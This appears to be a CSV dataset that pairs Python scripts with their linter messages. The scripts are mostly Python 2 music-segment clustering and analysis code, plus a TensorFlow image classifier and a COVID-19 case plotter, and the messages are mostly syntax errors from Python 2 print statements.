input,output
"1   import numpy as np
2   from collections import Counter
3   
4   def calculate(filename):
5       data = np.load(filename)
6       checked = data[1]
7       countClusters = Counter()
8       counter = Counter()
9       for i in checked:
10           countClusters[i] += 1
11       for i in countClusters.values():
12           counter[i] += 1
13       val = counter.values()
14       key = counter.keys()
15       sum = 0
16       for i in range(len(key)):
17           sum += val[i] * key[i] ** 2
18       sum += (len(checked) * len(countClusters.values()))
19       print sum
20       fin = sum * (4376.4/4999950000)
21       print fin
","19 - error: syntax-error
"
"1   """"""
2   h5_seg_to_array.py
3   
4   Usage: In the functions following this, the parameters are described as follows:
5   
6   dir: the directory to search
7   
8   filename: the filename for saving/loading the results to/from
9   
10   Program that parses all .h5 files in the passed in directory and subdirectories,
11   getting the segment arrays from each .h5 file and putting them into a 
12   numpy array for later use.  Each segment array is in the following format:
13   
14   [12 values for segment pitch, 12 values for segment timbre, 1 value for loudness
15   max, 1 value for loudness start, and 1 value for the segment duration]
16   
17   This program uses the hdf5_getters, which can be found here:
18   https://github.com/tbertinmahieux/MSongsDB/blob/master/PythonSrc/hdf5_getters.py
19   
20   Author: Chris Smith
21   
22   Date: 02.22.2015
23   """"""
24   import os
25   import numpy as np
26   import hdf5_getters as getters
27   
28   '''
29   Method that takes a directory, searches that directory, as well as any 
30   subdirectories, and returns a list of every .h5 file.
31   '''
32   def get_h5_files(dir):
33       list = []
34       for root, dirs, files in os.walk(dir):
35           for file in files:
36               name, extension = os.path.splitext(file)
37               if extension == "".h5"":
38                   list.append(os.path.realpath(os.path.join(root, file)))
39           for subdir in dirs:
40               get_h5_files(subdir)
41       return list
42   
43   '''
44   Method that takes a directory, gets every .h5 file in that directory (plus any
45   subdirectories), and then parses those files.  The outcome is a Numpy array
46   that contains every segment in each file. Each row in the array of arrays
47   contains pitch, timbre, loudness max, loudness start, and the duration of each
48   segment.
49   ''' 
50   def h5_files_to_np_array(dir, filename):
51       list = get_h5_files(dir)
52       num_done = 0
53       seg_array = []
54       #Go through every file and get the desired information.
55       for file in list:
56           song = getters.open_h5_file_read(file)
57           seg_append = np.array(getters.get_segments_pitches(song))
58           seg_append = np.c_[ seg_append, np.array(getters.get_segments_timbre(song))]
59           seg_append = np.c_[seg_append, np.array(getters.get_segments_loudness_max(song))]
60           seg_append = np.c_[seg_append, np.array(getters.get_segments_loudness_start(song))]
61           start = np.array(getters.get_segments_start(song))
62           for i in range(0,len(start)-1):    
63               if i != (len(start) - 1):
64                   start[i] = start[i+1] - start[i]
65           start[len(start) - 1] = getters.get_duration(song) - start[len(start) - 1]
66           seg_append = np.c_[seg_append, start]
67           #Add the arrays to the bottom of the list
68           seg_array.extend(seg_append.tolist())
69           song.close()
70           num_done = num_done + 1
71           #Gives a count for every 500 files completed
72           if num_done % 500 == 0:
73               print num_done,"" of "",len(list)
74       #Convert the list to a Numpy array
75       seg_array = np.array(seg_array)
76       #Save the array in a file
77       seg_array.dump(filename)
78       print len(seg_array),"" number of segments in the set.""
79       return seg_array
80       
81   '''
82   Method that opens the file with that filename.  The file must contain a 
83   Numpy array.  This method returns the array.
84   '''
85   def open(filename):
86       data = np.load(filename)
87       return data
","73 - error: syntax-error
"
"1   import numpy as np
2   
3   def check(filename):
4       clusters = np.load(filename)
5       clusters = clusters[1]
6       truths = np.load(""Results/groundtruths.npy"")
7       error = 0
8       total = 0
9       for i in range(len(truths)):
10           for j in range(len(truths[i])):
11               if clusters[truths[i][j]] != clusters[i]:
12                   error += 1
13               total += 1
14       print error
15       print total
","14 - error: syntax-error
"
"1   #!/usr/bin/env python
2   # encoding: utf=8
3   """"""
4   one.py
5   
6   Digest only the first beat of every bar.
7   
8   By Ben Lacker, 2009-02-18.
9   
10   """"""
11   
12   '''
13   one_segment.py
14   
15   Author: Chris Smith, 02-05-2015
16   
17   Changes made to original one.py:
18   
19       - Changes made to take the first segment out of every beat.
20       - Does not take the first beat from every bar anymore.
21   
22   The original code is stored at this address: https://github.com/echonest/remix/blob/master/examples/one/one.py
23   '''
24   import echonest.remix.audio as audio
25   
26   usage = """"""
27   Usage: 
28       python one.py <input_filename> <output_filename>
29   
30   Example:
31       python one.py EverythingIsOnTheOne.mp3 EverythingIsReallyOnTheOne.mp3
32   """"""
33   
34   def main(input_filename, output_filename):
35       audiofile = audio.LocalAudioFile(input_filename)
36       '''
37       This line got the bars of the song in the previous version:
38       bars = audiofile.analysis.bars
39       
40       Now, this line gets the beats in the song:
41       '''
42       beats = audiofile.analysis.beats
43       collect = audio.AudioQuantumList()
44       '''
45       This loop got the first beat in each bar and appended them to a list:
46       for bar in bars:
47           collect.append(bar.children()[0])
48           
49       Now, this loop gets the first segment in each beat and appends them to the list:
50       '''
51       for b in beats:
52           collect.append(b.children()[0])
53       out = audio.getpieces(audiofile, collect)
54       out.encode(output_filename)
55   
56   if __name__ == '__main__':
57       import sys
58       try:
59           input_filename = sys.argv[1]
60           output_filename = sys.argv[2]
61       except:
62           print usage
63           sys.exit(-1)
64       main(input_filename, output_filename)
","62 - error: syntax-error
"
"1   import matplotlib
2   matplotlib.use(""Agg"")
3   import numpy as np
4   import matplotlib.pyplot as plt
5   import time
6   from collections import Counter
7   
8   def truth_generator(filename):
9       data = np.load(filename)
10       data.resize(100000, 27)
11       truths = []
12       for i in range(len(data)):
13           truths.append([])
14       t0 = time.time()
15       for i in range(0,100000,10000):
16           a = data[i:i+10000,]
17           a[:,:12:] *= 10
18           a[:,26] *= 100
19           for j in range(i,100000,10000):
20               b = data[j:j+10000,]
21               b[:,:12:] *= 10
22               b[:,26] *= 100
23               c = seg_distances(a,b)
24               for k in range(len(c)):
25                   for l in range(len(c)):
26                       if c[k,l] <= 80:
27                           truths[k+i].append(l+j)
28               print ""Done. Onto the next one...""
29       print time.time() - t0
30       np.save(""Results/groundtruths"", truths)
31   
32   def histo_generator(filename):
33       data = np.load(filename)
34       labels = data[1]
35       counter = Counter()
36       for i in labels:
37           counter[i] += 1
38       if np.amax(len(counter)) / 50 >= 5:
39           bins = np.amax(len(counter)) / 50
40       else:
41           bins = 5
42       plt.hist(counter.values(), bins = bins)
43       plt.title('Number of members per cluster')
44       plt.xlabel('Number of members')
45       plt.ylabel('Number of occurrences')
46       ticks = range(0, bins)
47       #plt.xticks(ticks[0::50])
48       plt.gcf().savefig('Results/truthCountHistogram.png')
49       plt.close()
50   
51   def seg_distances(u_, v_=None):
52       from scipy.spatial.distance import pdist, cdist, squareform
53       from numpy import diag, ones
54       if v_ is None:
55           d_ = pdist(u_[:, 0:12], 'euclidean')
56           d_ += pdist(u_[:, 12:24], 'euclidean')
57           d_ += pdist(u_[:, 24:], 'cityblock')
58           d_ = squareform(d_) + diag(float('NaN') * ones((u_.shape[0],)))
59       else:
60           d_ = cdist(u_[:, 0:12], v_[:, 0:12], 'euclidean')
61           d_ += cdist(u_[:, 12:24], v_[:, 12:24], 'euclidean')
62           d_ += cdist(u_[:, 24:], v_[:, 24:], 'cityblock')
63   
64       return d_
","28 - error: syntax-error
"
"1   """"""
2   dir_comp.py
3   
4   Usage: In the functions following this, the parameters are described as follows:
5   
6   dir: the directory to search
7   
8   Program that parses all .mp3 files in the passed in directory,
9   gets the segment arrays from each .mp3 file and puts them into a
10   numpy array for later use.  Each segment array is in the following format:
11   
12   [12 values for segment pitch, 12 values for segment timbre, 1 value for loudness
13   max, 1 value for loudness start, and 1 value for the segment duration]
14   
15   Author: Chris Smith
16   
17   Date: 03.27.2015
18   """"""
19   import matplotlib
20   matplotlib.use(""Agg"")
21   import echonest.remix.audio as audio
22   import matplotlib.pyplot as plt
23   import scipy.spatial.distance as distance
24   import os
25   import numpy as np
26   
27   '''
28   Method that takes a directory, searches that directory, and returns a list of every .mp3 file in it.
29   '''
30   def get_mp3_files(dir):
31       list = []
32       for root, dirs, files in os.walk(dir):
33           for file in files:
34               name, extension = os.path.splitext(file)
35               if extension == "".mp3"":
36                   list.append(os.path.realpath(os.path.join(root, file)))
37       return list
38   
39   '''
40   Method that takes two .mp3 files and compares every segment within song A to 
41   every segment in song B and supplies a histogram that shows
42   the distances between segments (tuples of segments).  Also supplies some data
43   about the songs that were parsed.
44   '''
45   def two_song_comp(fileA, fileB):
46       #Defines the threshold for comparisons
47       thres = 45
48       nameA = os.path.basename(os.path.splitext(fileA)[0])
49       nameB = os.path.basename(os.path.splitext(fileB)[0])
50       adj_listA = []
51       adj_listB = []
52       sim_seg_countA = 0
53       sim_seg_countB = 0
54       sim_countA = 0
55       sim_countB = 0
56       audiofileA = audio.AudioAnalysis(fileA)
57       audiofileB = audio.AudioAnalysis(fileB)
58       segmentsA = audiofileA.segments
59       segmentsB = audiofileB.segments
60       #Get each segment's array of comparison data for song A
61       segsA = np.array(segmentsA.pitches)
62       segsA = np.c_[segsA, np.array(segmentsA.timbre)]
63       segsA = np.c_[segsA, np.array(segmentsA.loudness_max)]
64       segsA = np.c_[segsA, np.array(segmentsA.loudness_begin)]
65       segsA = np.c_[segsA, np.ones(len(segsA))]
66       #Get each segment's array of comparison data for song B
67       segsB = np.array(segmentsB.pitches)
68       segsB = np.c_[segsB, np.array(segmentsB.timbre)]
69       segsB = np.c_[segsB, np.array(segmentsB.loudness_max)]
70       segsB = np.c_[segsB, np.array(segmentsB.loudness_begin)]
71       segsB = np.c_[segsB, np.ones(len(segsB))]
72   
73       #Finish creating the adjacency list
74       for i in segmentsA:
75           adj_listA.append([])
76       for i in segmentsB:
77           adj_listB.append([])
78       #Finish getting the comparison data
79       for i in range(len(segsA)):
80           segsA[i][26] = segmentsA[i].duration
81       for i in range(len(segsB)):
82           segsB[i][26] = segmentsB[i].duration
83       #Get the euclidean distance for the pitch vectors, then multiply by 10
84       distances = distance.cdist(segsA[:,:12], segsB[:,:12], 'euclidean')
85       for i in range(len(distances)):
86           for j in range(len(distances[i])):
87               distances[i][j] = 10 * distances[i][j]
88       #Get the euclidean distance for the timbre vectors, adding it to the
89       #pitch distance
90       distances = distances + distance.cdist(segsA[:,12:24], segsB[:,12:24], 'euclidean')
91       #Get the rest of the distance calculations, adding them to the previous
92       #calculations.
93       for i in range(len(distances)):
94           for j in range(len(distances[i])):
95               distances[i][j] = distances[i][j] + abs(segsA[i][24] - segsB[j][24])
96               distances[i][j] = distances[i][j] + abs(segsA[i][25] - segsB[j][25]) + abs(segsA[i][26] - segsB[j][26]) * 100
97       i_point = 0
98       j_point = 0
99       #Use i_point and j_point for the indices in the 2D distances array
100       for i_point in range(len(distances)):
101           for j_point in range(len(distances[i])):
102               #Check to see if the distance between segment # i_point and
103               #segment # j_point is less than 45
104               if abs(distances[i_point][j_point]) <= thres:
105                   #Add to the adjacency lists if not already there
106                   if j_point not in adj_listA[i_point]:
107                       adj_listA[i_point].append(j_point)
108                   if i_point not in adj_listB[j_point]:
109                       adj_listB[j_point].append(i_point)
110               j_point = j_point + 1
111           i_point = i_point + 1
112           j_point = 0
113       #Get the count of the similarities in the adjacency lists
114       for i in adj_listA:
115           if len(i) > 0:
116               sim_countA = sim_countA + len(i);
117               sim_seg_countA = sim_seg_countA + 1
118       for i in adj_listB:
119           if len(i) > 0:
120               sim_countB = sim_countB + len(i);
121               sim_seg_countB = sim_seg_countB + 1
122   
123               #print i, ""\n""
124       print ""Num of segments with at least 1 match in song A: "", sim_seg_countA, "" out of"", len(segmentsA)
125       print ""Percentage of segments with at least 1 match in song A: "", (sim_seg_countA / float(len(segmentsA)) * 100), ""%""
126       print ""Num of similar tuples: "", sim_countA, "" out of "", len(segmentsA) *len(segmentsB)
127       print ""Percentage of possible tuples that are similar: "", sim_countA / float(len(segmentsA) * len(segmentsB)) * 100, ""%""
128       print ""Num of segments with at least 1 match in song B: "", sim_seg_countB, "" out of"", len(segmentsB)
129       print ""Percentage of segments with at least 1 match in song B: "", (sim_seg_countB / float(len(segmentsB)) * 100), ""%""
130       #Get the number of bins.  Calculated by taking the max range and dividing by 50
131       bins = int(np.amax(distances)) / thres
132       #Make the histogram with titles and axis labels.  Plot the line x=thres for visual comparison.
133       plt.hist(distances.ravel(), bins = bins)
134       plt.title('Distances between Tuples of Segments' + nameA + nameB)
135       plt.xlabel('Distances')
136       plt.ylabel('Number of occurrences')
137       plt.axvline(thres, color = 'r', linestyle = 'dashed')
138       #Make each tick on the x-axis correspond to the end of a bin.
139       plt.xticks(range(0, int(np.amax(distances) + 2 * thres), thres))
140       #Make each tick on the y-axis correspond to each 25000th number up to the number of possible tuple combos / 2.
141       plt.yticks(range(0, (len(segmentsA) * len(segmentsB))/2 + 25000, 25000))
142       plt.gcf().savefig('Histograms/' + nameA + 'and' + nameB + '_histogram.png')
143       plt.close()
144   
145   '''
146   Method that runs the comparison on every pair of .mp3 files in a directory
147   '''
148   def dir_comp(dir):
149       files = get_mp3_files(dir)
150       count = 0
151       total = sum(range(len(files) + 1))
152       for f1 in files:
153           for f2 in files:
154               nameA = os.path.basename(os.path.splitext(f1)[0])
155               nameB = os.path.basename(os.path.splitext(f2)[0])
156               if not os.path.isfile('Histograms/' + nameA + 'and' + nameB + '_histogram.png') and not os.path.isfile('Histograms/' + nameB + 'and' + nameA + '_histogram.png'):
157                   two_song_comp(f1, f2)
158                   print ""Comparison completed!""
159                   count = count + 1
160                   print count, "" out of "", total
161       print ""Finished.""
","124 - error: syntax-error
"
"1   """"""
2   seg_kmeans.py
3   
4   This code performs K-Means clustering on a dataset passed in as a pickled
5   NumPy array.
6   
7   There is a function (seg_kmeans) that performs K-Means on
8   the dataset not using another class's stuff.  There is another function
9   (KMeans) that performs K-Means on the dataset by using Scikit-Learn's
10   K-Means class inside of the cluster package.
11   Both functions have the follwoing parameters:
12   
13       1. filename: the file that contains the dataset (must be a pickled array)
14       2. clusters: the number of clusters to generate
15       3. iter: the max number of iterations to use
16   
17   This also saves the results to an output in the Results folder.
18   
19   Author: Chris Smith
20   
21   Version: 4.19.2015
22   """"""
23   import matplotlib
24   matplotlib.use(""Agg"")
25   import numpy as np
26   from numpy import random
27   import scipy.spatial.distance as distance
28   from sklearn import metrics
29   from sklearn import cluster
30   import matplotlib.pyplot as plt
31   import time
32   
33   '''
34   Figures out which cluster center that the segment x is closest to.
35   '''
36   def classify(x, size, centroids):
37       list = np.zeros(size)
38       for i in range(size):
39           list[i] = np.sqrt(np.sum((centroids[i] - x) ** 2))
40       return np.argmin(list)
41   '''
42   Figures out the cluster member counts and the max distances from the centers in each cluster.
43   Also, histograms are generated.
44   '''
45   def score(centers, centroids):
46       counts = np.zeros(len(centers))
47       maxes = np.zeros(len(centers))
48       index = 0
49       np.asarray(centers)
50       for i in range(len(centers)):
51           counts[index] = len(centers[index])
52           index += 1
53       for i in range(len(centers)):
54           maxes[i] = distance.cdist(centers[i], np.asarray(centroids[i]).reshape((1,27)), 'euclidean').max()
55       if np.amax(counts)/50 >= 5:
56           bins = np.amax(counts) / 50
57       else:
58           bins = 5
59       plt.hist(counts.ravel(), bins = bins)
60       plt.title('Number of members per cluster')
61       plt.xlabel('Number of members')
62       plt.ylabel('Number of occurrences')
63       ticks = range(0, int(np.amax(counts)))
64       plt.xticks(ticks[0::50])
65       plt.gcf().savefig('Results/countHistogram.png')
66       plt.close()
67       if np.amax(maxes)/50 >= 5:
68           bins = np.amax(maxes) / 50
69       else:
70           bins = 5
71    
72       plt.hist(maxes.ravel(), bins = bins)
73       plt.title('Max distance in cluster')
74       plt.xlabel('Max distances')
75       plt.ylabel('Number of occurrences')
76       ticks = range(0, int(np.amax(maxes)))
77       plt.xticks(ticks[0::50])
78       plt.gcf().savefig('Results/maxdistHistogram.png')
79       plt.close()
80   
81   
82       print ""Counts of each cluster:""
83       print counts
84       print ""------------------------------""
85       print ""The max distance from each center to a cluster member:""
86       print maxes
87       print ""------------------------------""
88   
89   '''
90   Performs K-Means clustering on a dataset of music segments without using a pre-made function.
91   Saves the results to a .npy file in the Results folder.
92   '''
93   def seg_kmeans(filename, clusters, iter):
94       #Initialize everything
95       data = np.load(filename)
96       #Use the first 1 million segments
97       data.resize(1000000,27)
98       centroids = np.empty((clusters, 27))
99       copyroids = np.empty((clusters, 27))
100       for i in range(0, clusters):
101           sample = random.randint(0, len(data))
102           centroids[i] = data[sample]
103       #Start the algorithm
104       stop = False
105       attempt = 1
106       numlist = []
107       while not stop and attempt <= iter:
108           #Initialize the lists
109           numlist = []
110           for i in range(clusters):
111               numlist.append([])
112           print ""Attempt Number: %d"" % attempt
113           #Classify stuff
114           for row in range(len(data)):
115               closest = classify(data[row], clusters, centroids)
116               numlist[closest].append(data[row])
117               if row % 10000 == 0:
118                   print row
119           #Redo the centroids
120           copyroids = centroids.copy()
121           for i in range(clusters):
122               if len(numlist[i]) > 0:
123                   centroids[i].put(range(27), np.average(numlist[i], axis=0).astype(np.int32))
124           attempt += 1
125           if np.any(centroids-copyroids) == 0:
126               stop = True
127       score(numlist, centroids)
128       np.save(""Results/clusterdata.npy"", numlist)
129   
130   '''
131   Performs the K-Means clustering algorithm that Scikit-Learn's cluster package provides.
132   Saves the output into a file called clusterdata.npy.  This file is located in the Results folder.
133   '''
134   def KMeans(filename, clusters, iter):
135       data = np.load(filename)
136       data.resize(100000,27)
137       print ""Loaded data""
138       t0 = time.time()
139       estimator = cluster.KMeans(n_clusters=clusters, n_init = 5, max_iter=iter, verbose=1, n_jobs=5)
140       estimator.fit(data)
141       print('%.2fs    %i'
142             % ((time.time() - t0), estimator.inertia_))
143       saveddata = [estimator.cluster_centers_, estimator.labels_, estimator.inertia_]
144       np.save(""Results/clusterdata.npy"", saveddata)
","82 - error: syntax-error
"
"1   """"""
2   timing.py
3   
4   Usage: In the functions following this, the parameters are described as follows:
5   
6   filename: the file that contains segment data
7   
8   This file must have been a NumPy array of segment data that was saved.  It is loaded through NumPy's load function.
9   
10   Each segment array is in the following format:
11   
12   [12 values for segment pitch, 12 values for segment timbre, 1 value for loudness
13   max, 1 value for loudness start, and 1 value for the segment duration]
14   
15   Author: Chris Smith
16   
17   Date: 04.11.2015
18   """"""
19   
20   import time
21   import scipy.spatial.distance as distance
22   import numpy as np
23   
24   '''
25   Method that takes a file of segment data (a 2D NumPy array), and compares the first 850 segments to 1000, 10000, 100000, and
26   1000000 segments.  The results are ignored, as this function times the comparisons.
27   '''
28   def comp_time(filename):
29       seg_array = np.load(filename)
30       song = seg_array[:850:].copy()
31       t1 = time.time()
32       distance.cdist(song, seg_array[:1000:],'euclidean')
33       t2 = time.time()
34       distance.cdist(song, seg_array[:10000:],'euclidean')
35       t3 = time.time()
36       distance.cdist(song, seg_array[:100000:],'euclidean')
37       t4 = time.time()
38       distance.cdist(song, seg_array[:1000000:],'euclidean')
39       t5 = time.time()
40       print ""Time for comparisons between a song and 1000 segments: "" + str(t2-t1)
41       print ""Time for comparisons between a song and 10000 segments: "" + str(t3-t2)
42       print ""Time for comparisons between a song and 100000 segments: "" + str(t4-t3)
43       print ""Time for comparisons between a song and 1000000 segments: "" + str(t5-t4)
","40 - error: syntax-error
"
"1   
2   # coding: utf-8
3   
4   # In[2]:
5   
6   import numpy as np
7   import tensorflow as tf
8   import requests
9   import urllib
10   from PIL import Image 
11   import os
12   import matplotlib.pyplot as plt
13   import cv2 as cv2
14   
15   get_ipython().magic('matplotlib inline')
16   
17   
18   # In[3]:
19   
20   os.chdir(""C:\\Users\\USER\\python studyspace\\Deep learning\\Project"")
21   pic = Image.open(""cat_test.jpg"")
22   new_image = pic.resize((32,32))
23   test1 = np.array(new_image)
24   test1 = test1.reshape(1,32,32,3)
25   print(test1.shape)
26   
27   
28   # In[5]:
29   
30   plt.imshow(pic)
31   
32   
33   # In[6]:
34   
35   sess = tf.Session()
36   
37   saver = tf.train.import_meta_graph('save2.ckpt.meta')
38   
39   saver.restore(sess, tf.train.latest_checkpoint('./'))
40       
41   graph = tf.get_default_graph()
42   
43   y_pred = graph.get_tensor_by_name(""train_pred:0"")
44   
45   x = graph.get_tensor_by_name(""train_dataset:0"")
46   y_true = graph.get_tensor_by_name(""train_label:0"")
47   
48   y_test_images = np.zeros((1,2))
49   
50   feed_dict_testing = {x: test1, y_true: y_test_images}
51   
52   result=sess.run(y_pred, feed_dict=feed_dict_testing)
53   
54   
55   # In[7]:
56   
57   print(result)
58   
59   
60   # In[ ]:
61   
62   
63   
","15 - error: undefined-variable
24 - error: too-many-function-args
8 - warning: unused-import
9 - warning: unused-import
13 - warning: unused-import
"
"1   # -*- coding: utf-8 -*-
2   """"""
3   Created on Sun May 10 23:34:29 2020
4   
5   @author: HP USER
6   """"""
7   
8   
9   import urllib.request, urllib.error, urllib.parse
10   import json
11   import sqlite3
12   import pandas as pd
13   from datetime import datetime
14   import matplotlib.pyplot as plt
15   import matplotlib
16   import numpy as np
17   
18   #retrieve json file and decode it
19   jsonFile = urllib.request.urlopen('https://api.covid19india.org/data.json').read()
20   data = json.loads(jsonFile)
21   
22   conn = sqlite3.connect('Covid19Data.sqlite')
23   cur = conn.cursor()
24   
25   #create a table in database if the table does not exists
26   cur.executescript('''
27               CREATE TABLE IF NOT EXISTS dailyCases(
28                   dailyConfirmed INTEGER NOT NULL, 
29                   dailyDeceased INTEGER NOT NULL, 
30                   dailyRecovered INTEGER NOT NULL,
31                   date TEXT NOT NULL UNIQUE,
32                   totalConfirmed INTEGER NOT NULL,
33                   totalDeceased INTEGER NOT NULL,
34                   totalRecovered INTEGER NOT NULL
35               );''')
36   
37   #%%
38   
39   #update the data in database for each date
40   for daily in data['cases_time_series']:
41       dailyData = list(daily.values())
42       cur.execute('''SELECT * FROM dailyCases WHERE date=?''', (dailyData[3], ))
43       result = cur.fetchone()
44       if result is None:
45           cur.execute('''
46                   INSERT INTO dailyCases (dailyConfirmed, dailyDeceased, dailyRecovered, date,
47                   totalConfirmed, totalDeceased, totalRecovered) VALUES ( ?, ?, ?, ?, ?, ?, ?)''', 
48                   (int(dailyData[0]), int(dailyData[1]), int(dailyData[2]), dailyData[3],
49                    int(dailyData[4]), int(dailyData[5]), int(dailyData[6])))
50       elif result[4] < int(dailyData[4]):
51           cur.execute('''
52                       UPDATE dailyCases
53                       SET totalConfirmed=?
54                       WHERE date=?''',
55                       (int(dailyData[4]), dailyData[3]))
56       conn.commit()
57   
58   
59   #%%
60   total = pd.read_sql('SELECT * FROM dailyCases', conn)
61   
62   #convert date to python datetime type object
63   def fun(x):
64       return datetime.strptime(x+str((datetime.today().year)), '%d %B %Y')
65   total['date'] = total['date'].apply(fun)
66   
67   #plot figure for total cases for each day
68   fig = plt.figure()
69   
70   plt.gca().xaxis.set_major_formatter(matplotlib.dates.DateFormatter('%d %b'))
71   plt.plot(total['date'], total['totalConfirmed'], '-o', ms=1)
72   plt.title('Total cases in India for each day')
73   plt.xlabel('Dates', fontsize=12)
74   plt.ylabel('Total cases', labelpad=0.1, fontsize=12)
75   
76   def slide(event):
77       date = int(event.xdata)
78       print(event.xdata)
79       dateIndex = date - dateLoc[0]+2
80       date = total['date'].iloc[dateIndex]
81       strDate = date.strftime('%d %b')
82       #text for displaying the total cases for each day
83       str = 'Total cases on {} were {}'.format(strDate, total['totalConfirmed'].iloc[dateIndex])
84       plt.cla()
85       plt.gca().xaxis.set_major_formatter(matplotlib.dates.DateFormatter('%d %b'))
86       plt.plot(total['date'], total['totalConfirmed'], '-o', ms=1)
87       plt.text(x=dateLoc[0], y=50000, s=str)
88       plt.title('Total cases in India for each day')
89       plt.xlabel('Dates', fontsize=12)
90       plt.ylabel('Total cases', labelpad=0.1, fontsize=12)
91       plt.draw()
92   
93   dateLoc = (plt.gca().xaxis.get_majorticklocs())
94   dateLoc = dateLoc.astype(np.int64)
95   fig.canvas.mpl_connect('button_press_event', slide)
96   
97   #plot the figure for new cases reported for each day
98   fig2 = plt.figure()
99   fig2.set_figheight(9)
100   fig2.set_figwidth(16)
101   fig2.gca().xaxis.set_major_formatter(matplotlib.dates.DateFormatter('%d %b'))
102   plt.bar(total['date'], total['dailyConfirmed'], width=0.8, alpha=0.8)
103   plt.plot(total['date'], total['dailyConfirmed'], c='red', alpha=0.8)
104   plt.title('New cases reported in India for each day')
105   plt.xlabel('Dates', fontsize=12)
106   plt.ylabel('New cases reported', labelpad=10, fontsize=12)
107   
108   def slide2(event):
109       date = int(round(event.xdata))
110       print(event.xdata)
111       dateIndex = date - dateLoc[0]+2
112       date = total['date'].iloc[dateIndex]
113       strDate = date.strftime('%d %b')
114   #    print(plt.gcf().texts())
115       str = 'Total cases reported on {} were {}'.format(strDate, total['dailyConfirmed'].iloc[dateIndex])
116       plt.cla()
117       plt.gca().xaxis.set_major_formatter(matplotlib.dates.DateFormatter('%d %b'))
118       plt.bar(total['date'], total['dailyConfirmed'], alpha=0.8)
119       plt.plot(total['date'], total['dailyConfirmed'], c='red', alpha=0.8)
120       plt.annotate(xy=(event.xdata, total['dailyConfirmed'].iloc[dateIndex]),
121                        xytext=(dateLoc[0], 4000), s=str,
122                        arrowprops={'arrowstyle':'->'})
123       plt.title('New cases reported in India for each day')
124       plt.xlabel('Dates', fontsize=12)
125       plt.ylabel('New cases reported', fontsize=12, labelpad=10)
126       plt.draw()
127   
128   fig2.canvas.mpl_connect('button_press_event', slide2)
129   
130   plt.show()
131   conn.close()
","19 - refactor: consider-using-with
83 - warning: redefined-builtin
115 - warning: redefined-builtin
"
